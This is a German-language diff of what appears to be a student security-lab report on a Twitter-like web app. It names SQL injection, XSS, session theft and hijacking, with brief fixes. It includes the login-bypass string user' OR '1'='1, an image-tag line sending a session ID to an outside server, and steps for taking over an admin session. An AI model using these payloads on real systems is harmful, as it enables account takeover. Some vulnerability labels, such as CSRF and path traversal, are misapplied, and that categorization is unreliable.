@@ -4,38 +4,70 @@ Nummer 1:
 =========
 
 - Kurzbeschreibung der Lücke:
+    Username und Passwort unsicher durch Sql abfrage:
+    man kann user' OR '1'='1 eintippen und erhällt einen Gültigen user
 - Typ der Sicherheitslücke gem. Vorlesung:
+    SQL Injection
 - Maßnahmen zu Behebung:
+    SQLite interne Funktionen verwenden
 - geänderte Dateien:
 
 Nummer 2:
 =========
 
 - Kurzbeschreibung der Lücke:
+    Html code oder Java Script code in der Url oder im Tweet ausführen
 - Typ der Sicherheitslücke gem. Vorlesung:
+    XSS Lücke
 - Maßnahmen zu Behebung:
+    Behebung durch überprüfung der Variablen auf Code
 - geänderte Dateien:
 
 Nummer 3:
 =========
 
 - Kurzbeschreibung der Lücke:
+    durch einschleusen von Java Script code im Tweet Fenster
+    Session ID an einen anderen Computer senden per <img src='myserver.com/img/$SessionId'>
 - Typ der Sicherheitslücke gem. Vorlesung:
+    CSRF Lücke
 - Maßnahmen zu Behebung:
+    Tweet auf Code überprüfen
 - geänderte Dateien:
+
 
 Nummer 4:
 =========
 
 - Kurzbeschreibung der Lücke:
+    Session eines anderen Nutzers übernehmen durch mitlesen von Cookies.
+    Obere Lücke Nutzen zum auslesen und senden eines cookies per route.
 - Typ der Sicherheitslücke gem. Vorlesung:
+    Session Hijacking
 - Maßnahmen zu Behebung:
+    Cookie HTTP only machen.
+    wichtige Funktionen durch authentifizierung absichern.
 - geänderte Dateien:
 
 Nummer 5:
 =========
 
 - Kurzbeschreibung der Lücke:
+    Nach dem ein Tweet erstellt wurde erscheint eine Nachricht oben auf der Html Seite.
+    Diese kann beliebig durch die URl geändert werden.
 - Typ der Sicherheitslücke gem. Vorlesung:
+    Path Traversal
 - Maßnahmen zu Behebung:
+    Speichern der Variablen intern Handlen anstatt von extern
 - geänderte Dateien:
+
+
+NebenInfos:
+    user' OR '1'='1 // SQL Injections im Login Fenster bei Benutzer und Passwort
+    Xss bei Tweet // HTML Code wird ausgeführt
+    Path Traversial in der URL // Message kann beliebig geändert werden
+    Session Hijacking:
+        offene Session in jeder Nachricht -> bekannt durch wireshark
+        Beispiel mitlesen von Admin Session -> Cookie update auf admin Session -> Voller Zugriff auf Admin rechte
+    Idee:
+        durch Tweets bei anderen Clients Befehle ausführen Cross-Site-Request-Forgery
